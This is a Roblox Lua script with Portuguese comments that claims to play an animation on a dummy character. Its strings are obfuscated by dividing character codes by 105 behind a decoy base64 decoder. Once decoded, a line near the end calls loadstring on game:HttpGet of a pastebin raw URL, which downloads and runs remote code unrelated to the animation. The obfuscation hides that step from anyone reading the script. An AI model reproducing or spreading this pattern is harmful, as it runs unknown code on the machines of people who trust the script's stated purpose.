local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function UYzYcYgtLXIMYUdlzEkjadFiKBMWaPAllMFgcqgrTiXfFBBfvpSrlnMlujMlAdQNgcApnjQtqIWiovR(data) m=string.sub(data, 0, 100) data=data:gsub(m,'')
 
data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
 
 
 
 
 
function PjukvfjPtFdhOrYqIsOIPiXnrfHTi(code)res=UYzYcYgtLXIMYUdlzEkjadFiKBMWaPAllMFgcqgrTiXfFBBfvpSrlnMlujMlAdQNgcApnjQtqIWiovR('gMwHoIiFGxktgTcnYIAPzodaMhkwkLbeHbDtEIchkLTjJICfevhtfejWvioDfTAXhtjYyDEiNcjYrKpnxzvQSOuqefjLABPDCCdN')for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
 
 
-- Referências aos objetos
local player = game.Workspace.Live[PjukvfjPtFdhOrYqIsOIPiXnrfHTi({9135,10605,10185,11235,10605,12075,12180,3360,7140,12285,11445,11445,12705})]
local playerHumanoid = player:FindFirstChildOfClass(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({7560,12285,11445,10185,11550,11655,11025,10500}))
 
-- IDs das animações
local playerAnimationId = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({11235})  -- ID de animação do jogador (não utilizado no script fornecido)
local dummyAnimationId = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({5145,5670,5985,5460,5565,5565,5565,5775,5460,5355,5355})  -- ID de animação do Dummy
 
-- Função para criar e adicionar animação
local function addAnimation(humanoid, animationId)
    local animation = Instance.new(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11025,11655,11550}))
    animation.AnimationId = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935}) .. animationId
    local animator = humanoid:FindFirstChildOfClass(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11655,11970}))
 
    if not animator then
        animator = Instance.new(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11655,11970}))
        animator.Name = PjukvfjPtFdhOrYqIsOIPiXnrfHTi({6825,11550,11025,11445,10185,12180,11655,11970})
        animator.Parent = humanoid
    end
 
    local animationTrack = animator:LoadAnimation(animation)
 
    -- Atrasar o início da animação em 0.8 segundos
    wait(0.8)
    animationTrack:Play()
end
loadstring(game:HttpGet(PjukvfjPtFdhOrYqIsOIPiXnrfHTi({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,8190,8820,12810,8505,9345,11865,12600,12705})))()
-- Adiciona a animação ao Dummy
addAnimation(playerHumanoid, dummyAnimationId)        
